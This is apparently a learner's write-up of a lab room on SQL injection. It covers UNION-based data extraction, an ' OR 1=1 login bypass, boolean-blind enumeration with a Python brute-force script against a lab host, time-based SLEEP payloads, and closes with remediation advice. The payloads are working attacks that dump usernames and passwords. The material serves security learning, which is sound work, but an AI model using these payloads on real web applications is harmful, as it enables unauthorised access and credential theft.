## What is a database?

A database is a way of electronically storing collections of data in an organised manner. A database is controlled by a DBMS, which is an acronym for  Database Management System. DBMSs fall into two camps: Relational and Non-Relational; some common ones you'll come across are MySQL, Microsoft SQL Server, Access, PostgreSQL and SQLite.

Within a DBMS, you can have multiple databases, each containing its own set of related data. For example, you may have a database called "shop". Within this database, you want to store information about products available to purchase, users who have signed up to your online shop, and information about the orders you've received. You'd store this information separately in the database using something called tables. The tables are identified with a unique name for each one. You can see this structure in the diagram below, but you can also see how a business might have other separate databases to store staff information or the accounts team.

## Relational Vs Non-Relational Databases:
A relational database stores information in tables, and often, the tables share information between them; they use columns to specify and define the data being stored and rows actually to store the data. The tables will often contain a column that has a unique ID (primary key), which will then be used in other tables to reference it and cause a relationship between the tables, hence the name relational database.


Non-relational databases, sometimes called NoSQL, on the other hand, are any sort of database that doesn't use tables, columns and rows to store the data. A specific database layout doesn't need to be constructed so each row of data can contain different information, giving more flexibility over a relational database.  Some popular databases of this type are MongoDB, Cassandra and ElasticSearch.

![alt text](image-17.png)

## What is SQL?

SQL (Structured Query Language) is a feature-rich language used for querying databases. These SQL queries are better referred to as statements.

![alt text](image-18.png)

## What is SQL Injection?
The point wherein a web application using SQL can turn into SQL Injection is when user-provided data gets included in the SQL query.

Take the following scenario where you've come across an online blog, and each blog entry has a unique ID number. The blog entries may be either set to public or private, depending on whether they're ready for public release. The URL for each blog entry may look something like this:

`https://website.thm/blog?id=1`

From the URL above, you can see that the blog entry selected comes from the id parameter in the query string. The web application needs to retrieve the article from the database and may use an SQL statement that looks something like the following:

`SELECT * from blog where id=1 and private=0 LIMIT 1;`

From what you've learned in the previous task, you should be able to work out that the SQL statement above is looking in the blog table for an article with the id number of 1 and the private column set to 0, which means it's able to be viewed by the public and limits the results to only one match.

As was mentioned at the start of this task, SQL Injection is introduced when user input is introduced into the database query. In this instance, the id parameter from the query string is used directly in the SQL query.

Let's pretend article ID 2 is still locked as private, so it cannot be viewed on the website. We could now instead call the URL:
 
`https://website.thm/blog?id=2;--`

Which would then, in turn, produce the SQL statement:

`SELECT * from blog where id=2;-- and private=0 LIMIT 1;`

The semicolon in the URL signifies the end of the SQL statement, and the two dashes cause everything afterwards to be treated as a comment. By doing this, you're just, in fact, running the query:

`SELECT * from blog where id=2;--`

Which will return the article with an ID of 2 whether it is set to public or not.

## In-Band SQL Injection

In-Band SQL Injection is the easiest type to detect and exploit; In-Band just refers to the same method of communication being used to exploit the vulnerability and also receive the results, for example, discovering an SQL Injection vulnerability on a website page and then being able to extract data from the database to the same page.


## Error-Based SQL Injection

This type of SQL Injection is the most useful for easily obtaining information about the database structure, as error messages from the database are printed directly to the browser screen. This can often be used to enumerate a whole database. 


## Union-Based SQL Injection
This type of Injection utilises the SQL UNION operator alongside a SELECT statement to return additional results to the page. This method is the most common way of extracting large amounts of data via an SQL Injection vulnerability.

## Practical
The key to discovering **error-based SQL Injection** is to break the code's SQL query by trying certain characters until an error message is produced; these are most commonly single apostrophes ( ' ) or a quotation mark ( " ).

Try typing an apostrophe ( ' ) after the id=1 and press enter. And you'll see this returns an SQL error informing you of an error in your syntax. The fact that you've received this error message confirms the existence of an SQL Injection vulnerability. We can now exploit this vulnerability and use the error messages to learn more about the database structure. 

The first thing we need to do is return data to the browser without displaying an error message. Firstly, we'll try the UNION operator so we can receive an extra result if we choose it. Try setting the mock browsers id parameter to:

`1 UNION SELECT 1`


This statement should produce an error message informing you that the UNION SELECT statement has a different number of columns than the original SELECT query. So let's try again but add another column:


`1 UNION SELECT 1,2`


Same error again, so let's repeat by adding another column:


`1 UNION SELECT 1,2,3`


Success, the error message has gone, and the article is being displayed, but now we want to display our data instead of the article. The article is displayed because it takes the first returned result somewhere in the website's code and shows that. To get around that, we need the first query to produce no results. This can simply be done by changing the article ID from 1 to 0.


`0 UNION SELECT 1,2,3`


You'll now see the article is just made up of the result from the UNION select, returning the column values 1, 2, and 3. We can start using these returned values to retrieve more useful information. First, we'll get the database name that we have access to:


`0 UNION SELECT 1,2,database()`


You'll now see where the number 3 was previously displayed; it now shows the name of the database, which is sqli_one.


Our next query will gather a list of tables that are in this database.


`0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'`


The method group_concat() gets the specified column (in our case, table_name) from multiple returned rows and puts it into one string separated by commas. The next thing is the information_schema database; every user of the database has access to this, and it contains information about all the databases and tables the user has access to. In this particular query, we're interested in listing all the tables in the sqli_one database, which is article and staff_users. 


As the first level aims to discover Martin's password, the staff_users table is what interests us. We can utilise the information_schema database again to find the structure of this table using the below query.


`0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'`


This is similar to the previous SQL query. However, the information we want to retrieve has changed from table_name to column_name, the table we are querying in the information_schema database has changed from tables to columns, and we're searching for any rows where the table_name column has a value of staff_users.


The query results provide three columns for the staff_users table: id, password, and username. We can use the username and password columns for our following query to retrieve the user's information.


`0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users`


Again, we use the group_concat method to return all of the rows into one string and make it easier to read. We've also added `,':',` to split the username and password from each other. Instead of being separated by a comma, we've chosen the HTML <br> tag that forces each result to be on a separate line to make for easier reading.

## SQL injection example
First, lists all databases accessible to the current user.

`0 UNION SELECT null, null, GROUP_CONCAT(schema_name) FROM information_schema.schemata;`

The page returned **information_schema,sqli_one**, let list all tables from sqli_one database

`0 UNION SELECT null, null, GROUP_CONCAT(table_name) FROM information_schema.tables where table_schema = 'sqli_one'`

The page return **article,staff_users**, now we keep finding the columns name with the payload:

`0 UNION SELECT null, null, GROUP_CONCAT(column_name) FROM information_schema.columns where table_schema = 'sqli_one'`

The page return **content,id,subject,id,password,username**, now we could get the username and password 

`0 UNION SELECT null, GROUP_CONCAT(username), GROUP_CONCAT(password) FROM staff_users`

The page return **admin,martin,jim** and **p4ssword,pa$$word,work123**

![alt text](image-20.png)

## Blind SQLi

Unlike In-Band SQL injection, where we can see the results of our attack directly on the screen, blind SQLi is when we get little to no feedback to confirm whether our injected queries were, in fact, successful or not, this is because the error messages have been disabled, but the injection still works regardless. It might surprise you that all we need is that little bit of feedback to successfully enumerate a whole database.


### Authentication Bypass

Login forms that are connected to a database of users are often developed in such a way that the web application isn't interested in the content of the username and password but more in whether the two make a matching pair in the users table. In basic terms, the web application is asking the database, "Do you have a user with the username bob and the password bob123?" the database replies with either yes or no (true/false) and, depending on that answer, dictates whether the web application lets you proceed or not. 

### Practical:

Level Two of the SQL Injection examples shows this exact example. We can see in the box labelled "SQL Query" that the query to the database is the following:


`select * from users where username='%username%' and password='%password%' LIMIT 1;`


To make this into a query that always returns as true, we can enter the following into the password field:


`' OR 1=1;--`


Which turns the SQL query into the following:


`select * from users where username='' and password='' OR 1=1;`


Because 1=1 is a true statement and we've used an OR operator, this will always cause the query to return as true, which satisfies the web applications logic that the database found a valid username/password combination and that access should be allowed.

![alt text](image-21.png)

## Boolean Based

Boolean-based SQL Injection refers to the response we receive from our injection attempts, which could be a true/false, yes/no, on/off, 1/0 or any response that can only have two outcomes. That outcome confirms that our SQL Injection payload was either successful or not. On the first inspection, you may feel like this limited response can't provide much information. Still, with just these two responses, it's possible to enumerate a whole database structure and contents.


### Practical:

On level three of the SQL Injection Examples Machine, you're presented with a mock browser with the following URL:

`https://website.thm/checkuser?username=admin`


The browser body contains  `{"taken":true}`. This API endpoint replicates a common feature found on many signup forms, which checks whether a username has already been registered to prompt the user to choose a different username. Because the taken value is set to true, we can assume the username admin is already registered. We can confirm this by changing the username in the mock browser's address bar from admin to admin123, and upon pressing enter, you'll see the value taken has now changed to false.


The SQL query that is processed looks like the following:


`select * from users where username = '%username%' LIMIT 1;`


The only input we have control over is the username in the query string, and we'll have to use this to perform our SQL injection. Keeping the username as admin123, we can start appending to this to try and make the database confirm true things, changing the state of the taken field from false to true.

Our first task is to discover the database name. We can do this by using the built-in database() method and then using the like operator to try and find results that will return a true status.

`admin123' UNION SELECT 1,2,3 where database() like '%';--`


We get a true response because, in the like operator, we just have the value of %, which will match anything as it's the wildcard value. If we change the wildcard operator to `a%`, you'll see the response goes back to false, which confirms that the database name does not begin with the letter a. We can cycle through all the letters, numbers and characters such as - and _ until we discover a match. If you send the below as the username value, you'll receive a true response that confirms the database name begins with the letter `s`.

To automatic the process, I used the following script:

```python
import requests
import string

url = "https://10-10-232-209.p.thmlabs.com/run"
chars = string.ascii_letters + string.digits + "_"
currentfound = ""

while True:
    found_char = False  
    for char in chars:
        payload = (
            f"level=3&sql=select * from users where username = 'nglong05' "
            f"union select null, null, null where database() like '{currentfound + char}%';--"
        )
        response = requests.post(url, data=payload)

        if '"message":"true"' in response.text:
            currentfound += char  
            print(f"Current database name: {currentfound}")
            found_char = True
            break  

    if not found_char:
        print(f"Final database name: {currentfound}")
        break
```

We got the database name: **sqli_three**, now that we need to get the table name, simply change the payload as:

```python
payload = (
    f"level=3&sql=select * from users where username = 'nglong05' "
    f"union select null, null, null FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like '{currentfound + char}%';--"
)
```
We got the table **users**, repeat the process to find the column name:
```python
payload = (
    f"level=3&sql=select * from users where username = 'nglong05' "
    f"union select null, null, null FROM information_schema.COLUMNS "
    f"WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like '{currentfound + char}%';--"
)
```
Once I've found the column named id, I continued to find other columns
```python
payload = (
    f"level=3&sql=select * from users where username = 'nglong05' "
    f"union select null, null, null FROM information_schema.COLUMNS "
    f"WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like '{currentfound + char}%' and COLUMN_NAME !='id';--"
)
``` 
Repeating this process three times will enable you to discover the columns' id, username and password. Which now you can use to query the users table for login credentials. First, you'll need to discover a valid username, which you can use the payload below:

```python
payload = (
    f"level=3&sql=select * from users where username = 'nglong05' "
    f"UNION SELECT 1,2,3 from users where username like '{currentfound + char}%"
)
``` 
Once you've cycled through all the characters, you will confirm the existence of the username admin. Now you've got the username. You can concentrate on discovering the password. The payload below shows you how to find the password:

```python
payload = (
    f"level=3&sql=select * from users where username = 'nglong05' "
    f"UNION SELECT 1,2,3 from users where username='admin' and password like '{currentfound + char}%"
)
``` 
![alt text](image-22.png)

## Time-Based


A time-based blind SQL injection is very similar to the above boolean-based one in that the same requests are sent, but there is no visual indicator of your queries being wrong or right this time. Instead, your indicator of a correct query is based on the time the query takes to complete. This time delay is introduced using built-in methods such as SLEEP(x) alongside the UNION statement. The SLEEP() method will only ever get executed upon a successful UNION SELECT statement. 


So, for example, when trying to establish the number of columns in a table, you would use the following query:


`admin123' UNION SELECT SLEEP(5);--`


If there was no pause in the response time, we know that the query was unsuccessful, so like on previous tasks, we add another column:


`admin123' UNION SELECT SLEEP(5),2;--`


This payload should have produced a 5-second delay, confirming the successful execution of the UNION statement and that there are two columns.


You can now repeat the enumeration process from the Boolean-based SQL injection, adding the SLEEP() method to the UNION SELECT statement.

If you're struggling to find the table name, the below query should help you on your way:


`referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--`

![alt text](image-23.png)

## Remediation

As impactful as SQL Injection vulnerabilities are, developers do have a way to protect their web applications from them by following the advice below:


### Prepared Statements (With Parameterized Queries):

In a prepared query, the first thing a developer writes is the SQL query, and then any user inputs are added as parameters afterwards. Writing prepared statements ensures the SQL code structure doesn't change and the database can distinguish between the query and the data. As a benefit, it also makes your code look much cleaner and easier to read.


### Input Validation:

Input validation can go a long way to protecting what gets put into an SQL query. Employing an allow list can restrict input to only certain strings, or a string replacement method in the programming language can filter the characters you wish to allow or disallow. 


### Escaping User Input:

Allowing user input containing characters such as ' " $ \ can cause SQL Queries to break or, even worse, as we've learnt, open them up for injection attacks. Escaping user input is the method of prepending a backslash (\) to these characters, which then causes them to be parsed just as a regular string and not a special character.

![alt text](image-24.png)